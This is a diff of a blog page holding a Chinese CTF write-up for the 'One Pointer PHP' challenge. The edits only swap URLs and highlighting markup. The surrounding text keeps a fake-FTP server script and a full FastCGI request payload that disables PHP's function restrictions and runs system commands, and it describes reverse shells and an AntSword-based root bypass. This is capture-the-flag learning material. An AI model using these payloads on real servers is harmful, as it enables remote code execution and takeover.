@@ -4,7 +4,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>蓝帽杯 One Pointer PHP - Theoyu</title>
 
 <meta name="description" content="">
-<link rel="canonical" href="http://localhost:4000/2021/bluehat"><link rel="alternate" type="application/rss+xml" title="Theoyu" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
+<link rel="canonical" href="https://theoyu.top/2021/bluehat"><link rel="alternate" type="application/rss+xml" title="Theoyu" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
 
 <meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
 
@@ -636,7 +636,7 @@ data=O%3a4%3a"User"%3a1%3a{s%3a5%3a"count"%3bi%3a9223372036854775806%3b}
 
 <p>发现只能看当前目录，多半是<code class="language-plaintext highlighter-rouge">open_basedir</code>设置了只有当前目录，不过这个好说，p神有文章绕过这个，然后看了一眼<strong>phpinfo()</strong> …</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505180925973.png" alt="image-20210505180925973" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505180925973.png" alt="image-20210505180925973" /></p>
 
 <p><strong>putenv</strong> 居然被过滤了！前几天还专门研究了这个，不过在<strong>phpinfo()</strong> 中发现<strong>Server API =FPM/FastCGI</strong> ，之前学<strong>SSRF</strong> 的时候有接触过这个，可以通过这个RCE，但好像根本没有ssrf的入口..思绪在这里就断了</p>
 
@@ -663,7 +663,7 @@ data=O%3a4%3a"User"%3a1%3a{s%3a5%3a"count"%3bi%3a9223372036854775806%3b}
 
 <p>这个读取过程也是很折磨，大概就是一点一点摸索吧，在配置文件发现了fastcgi的开放端口…然后就不会了…</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505162441456.png" alt="image-20210505162441456" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505162441456.png" alt="image-20210505162441456" /></p>
 
 <p>看wp发现师傅们用的是<strong>ftp 与 php-fpm 对话 RCE</strong>，具体可参考<a href="https://www.anquanke.com/post/id/233454">这一篇文章</a>，后续我应该也会专门总结一篇关于fastcgi和fpm的文章。</p>
 
@@ -916,37 +916,37 @@ data=O%3a4%3a"User"%3a1%3a{s%3a5%3a"count"%3bi%3a9223372036854775806%3b}
 <span class="cp">?&gt;</span>
 </code></pre></div></div>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505184651947.png" alt="image-20210505184651947" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505184651947.png" alt="image-20210505184651947" /></p>
 
 <p>然后在vps上起ftp：</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>
-<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> 
-<span class="n">s</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="s">'0.0.0.0'</span><span class="p">,</span> <span class="mi">12345</span><span class="p">))</span>
-<span class="n">s</span><span class="p">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-<span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>
-<span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'220 welcome</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">socket</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> 
+<span class="n">s</span><span class="p">.</span><span class="nf">bind</span><span class="p">((</span><span class="s">'0.0.0.0'</span><span class="p">,</span> <span class="mi">12345</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">accept</span><span class="p">()</span>
+<span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'220 welcome</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
 <span class="c1">#Service ready for new user.
 #Client send anonymous username
 #USER anonymous
-</span><span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'331 Please specify the password.</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+</span><span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'331 Please specify the password.</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
 <span class="c1">#User name okay, need password.
 #Client send anonymous password.
 #PASS anonymous
-</span><span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'230 Login successful.</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+</span><span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'230 Login successful.</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
 <span class="c1">#User logged in, proceed. Logged out if appropriate.
 #TYPE I
-</span><span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'200 Switching to Binary mode.</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+</span><span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'200 Switching to Binary mode.</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
 <span class="c1">#Size /
-</span><span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'550 Could not get the file size.</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+</span><span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'550 Could not get the file size.</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
 <span class="c1">#EPSV (1)
-</span><span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'150 ok</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+</span><span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'150 ok</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
 <span class="c1">#PASV
-</span><span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'227 Entering Extended Passive Mode (127,0,0,1,0,9001)</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span> <span class="c1">#STOR / (2) 注意打到9001端口的服务
-</span><span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'150 Permission denied.</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+</span><span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'227 Entering Extended Passive Mode (127,0,0,1,0,9001)</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span> <span class="c1">#STOR / (2) 注意打到9001端口的服务
+</span><span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'150 Permission denied.</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
 <span class="c1">#QUIT
-</span><span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'221 Goodbye.</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
-<span class="n">conn</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'221 Goodbye.</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 </code></pre></div></div>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/add_api.php?backdoor<span class="o">=</span><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">'file'</span><span class="o">]</span><span class="p">;</span><span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">'data'</span><span class="o">]</span><span class="p">;</span>file_put_contents<span class="o">(</span><span class="nv">$file</span>,<span class="nv">$data</span><span class="o">)</span><span class="p">;</span>&amp;file<span class="o">=</span>ftp://ip:12345/&amp;data<span class="o">=</span>%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%021%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%A5PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00
@@ -954,7 +954,7 @@ data=O%3a4%3a"User"%3a1%3a{s%3a5%3a"count"%3bi%3a9223372036854775806%3b}
 
 <p>打过去，看vps上的ftp断开，说明对话成功，回头看一眼<strong>phpinfo()</strong>:</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505185334445.png" alt="image-20210505185334445" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505185334445.png" alt="image-20210505185334445" /></p>
 
 <p>后面就好说了，然鹅当我打开蚁剑，发现还是什么也动不了，命令执行还是和之前一模一样…我傻了</p>
 
@@ -983,7 +983,7 @@ data=O%3a4%3a"User"%3a1%3a{s%3a5%3a"count"%3bi%3a9223372036854775806%3b}
 
 <p>同时vps打开监听，反弹成功后终于可以动了。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505204851091.png" alt="image-20210505204851091" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505204851091.png" alt="image-20210505204851091" /></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@2be1b7732d18:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span>
 total 8
@@ -1037,13 +1037,13 @@ drwxr-xr-x    1 root root   39 Apr 29 14:53 var
 <span class="cp">?&gt;</span>
 </code></pre></div></div>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505211624222.png" alt="image-20210505211624222" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505211624222.png" alt="image-20210505211624222" /></p>
 
 <h2 id="工具流谬杀">工具流谬杀</h2>
 
 <p>本来以为这就结束了，看大佬博客的时候居然看到一位师傅改蚁剑脚本就能解题，我?????，复现一下。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505213712742.png" alt="image-20210505213712742" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505213712742.png" alt="image-20210505213712742" /></p>
 
 <p>蚁剑的自带工具就有关于FCGI的disable_function绕过，但要求<strong>fsockopen</strong>函数没有被过滤，并且默认端口为9000，所以当然直接用是绕过不了的。</p>
 
@@ -1056,15 +1056,15 @@ drwxr-xr-x    1 root root   39 Apr 29 14:53 var
 
 <p>把9000端口改为9001,<strong>fsockopen</strong>改为<strong>pfsockopen</strong>,然后传一个普通的一句话在html/下，用这个php去连接。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505214756517.png" alt="image-20210505214756517" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505214756517.png" alt="image-20210505214756517" /></p>
 
 <p>会在<strong>html/</strong>生成一个<strong>.antproxy.php</strong>文件。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505220251625.png" alt="image-20210505220251625" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505220251625.png" alt="image-20210505220251625" /></p>
 
 <p>再用这个文件做马连接蚁剑，发现已经成为root用户..用php权限可直接查看flag。。。太骚了，妥妥的非预期。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505220421304.png" alt="image-20210505220421304" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505220421304.png" alt="image-20210505220421304" /></p>
 
 <h2 id="后话">后话</h2>
 
@@ -1125,7 +1125,7 @@ drwxr-xr-x    1 root root   39 Apr 29 14:53 var
   *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
   *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
   var disqus_config = function () {
-    this.page.url = 'http://localhost:4000/2021/bluehat';
+    this.page.url = 'https://theoyu.top/2021/bluehat';
     this.page.identifier = '蓝帽杯 One Pointer PHP';
   };
   (function() { // DON'T EDIT BELOW THIS LINE
